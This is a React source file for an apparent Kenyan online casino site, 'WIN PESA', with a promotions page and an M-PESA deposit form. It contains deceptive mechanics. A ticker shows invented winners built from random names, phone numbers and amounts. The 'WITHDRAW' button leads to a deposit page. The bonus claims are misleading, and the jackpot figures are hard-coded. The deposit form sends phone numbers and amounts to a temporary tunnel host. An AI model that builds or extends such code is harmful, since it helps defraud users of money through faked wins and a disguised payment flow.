import React, { useState, useEffect } from 'react';
import { Search, Crown, Gamepad2, Trophy, Zap, Database, Gift, FolderRoot as Football, Timer, Diamond, ShoppingCart, Award, Menu, ArrowLeft } from 'lucide-react';

function WinnerTicker() {
  const [winners, setWinners] = useState<string[]>([]);

  const generateRandomWinner = () => {
    const games = ['Hot to Burn', 'Shining Crown', 'JetX', 'Mayan Gold', 'Lucky Dragons', 'Fortune Wheel', 'Golden Safari', 'Space Adventure'];
    const usernames = ['Lucky', 'Winner', 'Player', 'Gamer', 'Star', 'Champion', 'Master', 'Pro'];
    const randomGame = games[Math.floor(Math.random() * games.length)];
    const randomUsername = usernames[Math.floor(Math.random() * usernames.length)] + Math.floor(Math.random() * 1000);
    const randomPhone = `+254${Math.floor(Math.random() * 9000000) + 1000000}`;
  
    // Mask the middle digits of the phone number
    const maskedPhone = randomPhone.replace(/(\d{3})\d{4}(\d{3})/, '$1****$2');
  
    const randomAmount = Math.floor(Math.random() * 50000) + 1000;
    return `${randomUsername} (${maskedPhone}) won ${randomAmount} KSH in ${randomGame}!`;
  };

  useEffect(() => {
    const initialWinners = Array(5).fill(null).map(generateRandomWinner);
    setWinners(initialWinners);

    const interval = setInterval(() => {
      setWinners(prev => {
        const newWinners = [...prev];
        newWinners.shift();
        newWinners.push(generateRandomWinner());
        return newWinners;
      });
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="bg-[#1a2332] py-2 overflow-hidden border-t border-b border-gray-700">
      <div className="animate-marquee whitespace-nowrap">
        {winners.map((winner, index) => (
          <span key={index} className="text-green-400 mx-4 text-sm">🎉 {winner}</span>
        ))}
      </div>
    </div>
  );
}

function Header() {
  const [currentPage, setCurrentPage] = useState('main');

  const renderPage = () => {
    switch(currentPage) {
      case 'promotions':
        return <PromotionsPage onBack={() => setCurrentPage('main')} onClaim={() => setCurrentPage('deposit')} />;
      case 'deposit':
        return <DepositPage onBack={() => setCurrentPage('main')} />;
      default:
        return <MainContent />;
    }
  };

  return (
    <>
      <header className="bg-[#1a2332] p-4">
        <div className="container mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-purple-500 text-xl md:text-2xl font-bold">WIN PESA</h1>
            <div 
              className="bg-purple-600 px-3 py-1 md:px-4 md:py-2 rounded cursor-pointer hover:bg-purple-700"
              onClick={() => setCurrentPage('promotions')}
            >
              <span className="text-white text-sm md:text-base">PROMOTIONS</span>
              
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <div className="relative hidden md:block">
              <input
                type="search"
                placeholder="Search"
                className="px-4 py-2 rounded-lg w-[200px] md:w-[300px]"
              />
              <Search className="absolute right-3 top-2.5 text-gray-400" size={20} />
            </div>
            <div className="flex items-center gap-2 text-yellow-400">
              <span>0</span>
              <span>KSH</span>
            </div>
            <button 
              className="bg-green-400 px-4 py-1 md:px-6 md:py-2 rounded font-semibold hover:bg-green-500 text-sm md:text-base"
              onClick={() => setCurrentPage('deposit')}
            >
              WITHDRAW
            </button>
            <Menu className="text-white cursor-pointer" size={24} />
            
          </div>
        </div>
      </header>
      {renderPage()}
    </>
  );
}

function PromotionsPage({ onBack, onClaim }: { onBack: () => void; onClaim: () => void }) {
  return (
    <div className="min-h-screen bg-[#0f1623] p-4 md:p-8">
      <div className="container mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center text-white mb-6 hover:text-purple-400"
        >
          <ArrowLeft className="mr-2" /> Back
        </button>
        <div className="bg-purple-600 rounded-lg p-4 md:p-8 text-white">
          <h2 className="text-2xl md:text-3xl font-bold mb-4">🎉 Double Deposit Bonus!</h2>
          <p className="text-lg md:text-xl mb-6">Get 100% bonus on your first deposit up to 5000 KSH!</p>
          <div className="bg-[#1a2332] p-4 md:p-6 rounded-lg max-w-md">
            <h3 className="text-xl font-semibold mb-4">How it works:</h3>
            <ul className="list-disc list-inside space-y-2 mb-6">
              <li>Deposit any amount from 10 KSH to 5000 KSH</li>
              <li>Receive an instant 100% bonus</li>
              <li>Withdraw your bonus  any time</li>
            </ul>
            <button 
              className="bg-yellow-400 text-black px-4 py-2 md:px-6 md:py-3 rounded font-semibold w-full hover:bg-yellow-500"
              onClick={onClaim}
            >
              Claim Now
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function DepositPage({ onBack }: { onBack: () => void }) {
  const [phone, setPhone] = useState('');
  const [amount, setAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setMessage('');

    try {
      const response = await fetch('https://victorian-lenders-viewpicture-dimensions.trycloudflare.com/api/deposit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone, amount }),
      });

      const data = await response.json();
      if (data.success) {
        setMessage('Request sent successfully!Please wait.');
        setPhone('');
        setAmount('');
      }
    } catch (error) {
      setMessage('Failed to process. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0f1623] p-4 md:p-8">
      <div className="container mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center text-white mb-6 hover:text-purple-400"
        >
          <ArrowLeft className="mr-2" /> Back
        </button>
        <div className="bg-[#1a2332] rounded-lg p-4 md:p-8 max-w-md mx-auto">
          <h2 className="text-xl md:text-2xl font-bold text-white mb-6">M-PESA</h2>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-white mb-2">Phone Number</label>
              <input
                type="tel"
                placeholder="0700000000"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full px-4 py-2 rounded-lg"
                required
              />
            </div>
            <div>
              <label className="block text-white mb-2">Amount (KSH)</label>
              <input
                type="number"
                placeholder="Enter amount"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="w-full px-4 py-2 rounded-lg"
                required
                min="10"
              />
            </div>
            {message && (
              <div className={`p-3 rounded ${message.includes('success') ? 'bg-green-600' : 'bg-red-600'} text-white`}>
                {message}
              </div>
            )}
            <button 
              type="submit" 
              className="bg-yellow-400 text-black px-4 py-2 md:px-6 md:py-3 rounded font-semibold w-full hover:bg-yellow-500 disabled:opacity-50"
              disabled={isSubmitting}
            >
              {isSubmitting ? 'Processing...' : 'Deposit Now'}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}

function Navigation() {
  const navItems = [
    { icon: <Trophy size={20} />, label: 'Top Games' },
    { icon: <Crown size={20} />, label: 'Providers' },
    { icon: <Trophy size={20} />, label: 'Big Win' },
    { icon: <Zap size={20} />, label: 'Jumbo Win' },
    { icon: <Database size={20} />, label: 'Crash Games' },
    { icon: <Database size={20} />, label: 'Low Data' },
    { icon: <Gift size={20} />, label: 'New Games' },
    { icon: <Football size={20} />, label: 'Virtual Sport' },
    { icon: <Timer size={20} />, label: 'Instant Win' },
    { icon: <Gift size={20} />, label: 'Drops&Wins' },
    { icon: <Diamond size={20} />, label: 'ForHer' },
    { icon: <Gamepad2 size={20} />, label: '3 x 3' },
    { icon: <ShoppingCart size={20} />, label: 'Buy Free Spins' },
    { icon: <Award size={20} />, label: 'WinLeague' },
  ];

  return (
    <nav className="bg-[#1a2332] border-t border-gray-700">
      <div className="container mx-auto py-2">
        <div className="flex items-center gap-4 overflow-x-auto">
          {navItems.map((item, index) => (
            <div
              key={index}
              className="flex items-center gap-2 text-white cursor-pointer px-3 py-2 hover:bg-gray-700 rounded whitespace-nowrap"
            >
              {item.icon}
              <span className="text-sm">{item.label}</span>
            </div>
          ))}
        </div>
      </div>
    </nav>
  );
}

function JackpotSection() {
  return (
    <div className="bg-purple-600 p-4 md:p-6 rounded-lg">
      <h2 className="text-xl md:text-2xl text-white mb-4">Jackpot</h2>
      <div className="space-y-4">
        <div className="flex justify-between text-white">
          <span>Mega</span>
          <span>407,271 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Grand</span>
          <span>182,273 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Major</span>
          <span>428,588 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Mini</span>
          <span>1,089 KSH</span>
        </div>
      </div>
    </div>
  );
}

function GameCard({ title, type, image }: { title: string; type: string; image: string }) {
  return (
    <div className="relative rounded-lg overflow-hidden cursor-pointer transform hover:scale-105 transition-transform">
      <img src={image} alt={title} className="w-full h-48 object-cover" />
      <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded">
        {type}
      </div>
      <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
        <h3 className="text-white font-semibold text-sm md:text-base">{title}</h3>
      </div>
    </div>
  );
}

function GameGrid() {
  const games = [
    {
      title: 'Hot to Burn Hold & Spin',
      type: 'LAST PLAYED',
      image: 'https://images.unsplash.com/photo-1605418936226-19f415492517?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Shining Crown',
      type: 'JACKPOT',
      image: 'https://images.unsplash.com/photo-1596838132731-3301c3fd4317?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'JetX',
      type: 'POPULAR',
      image: 'https://images.unsplash.com/photo-1612287230517-96af97523121?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Mayan Gold',
      type: 'NEW',
      image: 'https://images.unsplash.com/photo-1563941406054-949225931d44?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Lucky Dragons',
      type: 'TOURNAMENT',
      image: 'https://images.unsplash.com/photo-1567095761054-7a02e69e5c43?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Fortune Wheel',
      type: 'TOP GAME',
      image: 'https://images.unsplash.com/photo-1518893494013-481c1d8ed3fd?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Golden Safari',
      type: 'NEW',
      image: 'https://images.unsplash.com/photo-1516953953850-0c5b6121c8f1?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Space Adventure',
      type: 'FEATURED',
      image: 'https://images.unsplash.com/photo-1614728894747-a83421e2b9c9?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    }
  ];

  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
      {games.map((game, index) => (
        <GameCard key={index} {...game} />
      ))}
    </div>
  );
}

function PaymentMethods() {
  return (
    <div className="bg-[#1a2332] p-4 rounded-lg">
      <h2 className="text-xl text-white mb-4">Paybill Numbers</h2>
      <div className="space-y-4">
        {['Safaricom', 'M-PESA', 'Airtel', 'iPay'].map((provider, index) => (
          <div key={index} className="flex justify-between items-center">
            <span className="text-green-500">{provider}</span>
            <button className="bg-yellow-400 px-4 py-1 rounded font-semibold hover:bg-yellow-500">
              DEPOSIT
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

function MainContent() {
  return (
    <>
      <Navigation />
      <WinnerTicker />
      <main className="container mx-auto py-4 md:py-8">
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4 md:gap-8">
          <div className="lg:col-span-1">
            <JackpotSection />
          </div>
          <div className="lg:col-span-2">
            <GameGrid />
          </div>
          <div className="lg:col-span-1">
            <PaymentMethods />
          </div>
        </div>
      </main>
    </>
  );
}

function App() {
  return (
    <div className="min-h-screen bg-[#0f1623]">
      <Header />
    </div>
  );
}

export default App;